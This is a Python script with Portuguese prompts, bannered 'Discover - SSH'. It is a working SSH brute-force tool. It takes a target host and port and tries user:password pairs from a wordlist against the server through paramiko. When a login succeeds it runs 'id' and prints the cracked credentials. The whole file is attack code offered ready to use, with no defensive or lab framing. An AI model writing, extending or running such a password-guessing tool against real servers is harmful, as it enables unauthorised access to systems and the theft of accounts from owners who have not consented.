import os
import sys
import paramiko

# Para limpar o terminal:

def cleanscreen():
	if sys.platform == "win32":
		os.system("cls")
	elif sys.platform == "linux":
		os.system("clear")
	else:
		try:
			os.system("clear")
		except:
			pass

# Programa:
cleanscreen()
print("""\033[1;31m
 ____  _                                   _____ _____ _____
|    \|_|___ ___ ___ _ _ ___ ___    ___   |   __|   __|  |  |
|  |  | |_ -|  _| . | | | -_|  _|  |___|  |__   |__   |     |
|____/|_|___|___|___|\_/|___|_|           |_____|_____|__|__|\n
\033[m""")

conexao = paramiko.SSHClient()
conexao.load_system_host_keys()
conexao.set_missing_host_key_policy(paramiko.AutoAddPolicy)
try:
	host_ip_dns = str(input("\033[1m[\033[m\033[1;32m+\033[m\033[1m]\033[m\033[1m Host alvo: ")).strip()
	host_tports = str(input("\033[1m[\033[m\033[1;32m+\033[m\033[1m]\033[m\033[1m Port host: ")).strip()
except KeyboardInterrupt:
	raise SystemExit
else:
	try:
		if host_ip_dns and host_tports != "":
			with open("sshpasswdwl.txt","r") as pwdfile:
				tamanho = open("sshpasswdwl.txt","r")
				print("\n\033[1;33m[*]\033[m\033[1m Tamanho da wordlsit: {}\033[m".format(len(tamanho.readlines())))
				print("\033[1;33m[*]\033[m\033[1m Status:\033[m\033[1;32m Iniciado!\033[m\n")
				for user_pass in pwdfile:
					credenciais = user_pass.replace("\n","").split(":")
					username_sh = credenciais[0].strip()
					password_sh = credenciais[1].strip()
					print("\033[1m[\033[m\033[1;36m>\033[m\033[1m]\033[m\033[1m Tentando com usuário: \033[1;33m{}\033[m e senha: \033[1;33m{}\033[m".format(username_sh,password_sh))
		# Saída do programa:
					try:
						conexao.connect(hostname=host_ip_dns,username=username_sh,password=password_sh,port=int(host_tports))
					except paramiko.ssh_exception.AuthenticationException:
						print("\033[1m[\033[m\033[1;31m-\033[m\033[1m]\033[m\033[1m Senha incorreta!\033[m")
						conexao.close()
						continue
					except paramiko.ssh_exception.socket.error:
						print("Conexão recusada pelo host!")
						raise SystemExit
					except paramiko.ssh_exception.NoValidConnectionsError:
						print("Host recusou ipv4/ipv6 conect")
						raise SystemExit
					except TimeoutError:
						print("Tempo limite excedido!")
						raise SystemExit
					except paramiko.ssh_exception.SSHException:
						cleanscreen()
						print("Host não encontrado ou ssh oculto!")
						raise SystemExit
					except KeyboardInterrupt:
						print("\n\033[1m[\033[m\033[1;31m-\033[m\033[1m]\033[m\033[1m Fechando programa...")
						raise SystemExit
					except:
						print("Host aceita apenas public key!")
						raise SystemExit
					else:
						stdin,stdout,stderr = conexao.exec_command("id")
						for resp in stdout:
							resposta = resp.replace("\n","")
							if "shell access is not enabled on your account" in resposta.lower():
								print("\n\033[1m[\033[m\033[1;33m*\033[m\033[1m]\033[m\033[1m Login efetuado com sucesso, mas o usuário \033[1;36m{}\033[m não tem uma shell!".format(username_sh))
							else:
								print("\n\033[1m[\033[m\033[1;32m>\033[m\033[1m]\033[m\033[1;32m CREDENCIAIS ENCONTRADAS:\033[m")
								print("\033[1m[\033[m\033[1;32m>\033[m\033[1m]\033[m\033[1m Hostname: {}".format(host_ip_dns))
								print("\033[1m[\033[m\033[1;32m>\033[m\033[1m]\033[m\033[1m Username: {}".format(username_sh))
								print("\033[1m[\033[m\033[1;32m>\033[m\033[1m]\033[m\033[1m Password: {}\n".format(password_sh))
								conexao.close()
								raise SystemExit
		else:
			print("\n\033[1m[\033[m\033[1;31m>\033[m\033[1m]\033[m\033[1m Passe um host e uma porta para se autenticar!\n")
	except KeyboardInterrupt:
		raise SystemExit
